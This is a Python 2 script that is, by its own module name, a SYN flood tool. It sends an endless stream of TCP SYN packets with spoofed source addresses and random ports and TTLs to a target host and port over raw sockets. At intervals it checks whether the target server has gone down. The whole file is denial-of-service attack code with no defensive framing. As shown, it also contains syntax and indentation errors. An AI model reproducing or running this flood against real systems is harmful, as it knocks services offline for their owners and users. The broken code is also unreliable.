#!/usr/bin/env python

def sendpacket(Ip_range, destinationnew, targetport, destination):
    from scapy.all import IP, TCP
    from checkserversdown_synflood import *
    import random
    import socket
    silva = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    silva.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    cnt = 1
    cntchecksum = 1
    cntcheck = 1
    if type(Ip_range) != list:
        while 0 == 0:
             try:
                 pkt = IP(dst = str(destinationnew), src = str(Ip_range), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S"))
                 silva.sendto(bytes(pkt), (str(destinationnew), 0))
                 print str(cnt) + ' packages sent!' 
                 if cntcheck == 1:
                    cntcheck = random.randint(8000, 10000)
                    cnt = cnt + 1
                    cntchecksum = cntchecksum + 1
                   
                 else:
                    if cntchecksum == cntcheck:
                       if 'h' in destination:
                           checkserversdown(destination)
                           cntcheck = 1
                    else:
                       cnt = cnt + 1
                       cntchecksum = cntchecksum + 1
             
                 
             except socket.error, e:
                 silva.close()
                 silva = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
                 silva.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

        
    else: 
       while 0 == 0:
           try:
               sourceIP = random.choice(Ip_range)
               silva.send(bytes(IP(dst = str(destinationnew), src = str(sourceIP), ttl=int(random.randint(80, 254)))/TCP(dport = int(targetport), sport = int(random.randint(1024, 65535)), flags = "S")))
               Ip_range.remove(sourceIP)
               if cntcheck == 1:
                    cntcheck = random.randint(8000, 10000)
                    cnt = cnt + 1
                    cntchecksum = cntchecksum + 1
                   
                 else:
                    if cntchecksum == cntcheck:
                       if 'h' in destination:
                           checkserversdown(destination)
                           cntcheck = 1
                    else:
                       cnt = cnt + 1
                       cntchecksum = cntchecksum + 1




           except socket.error, e:         
               silva.close()
               silva = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
               silva.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)

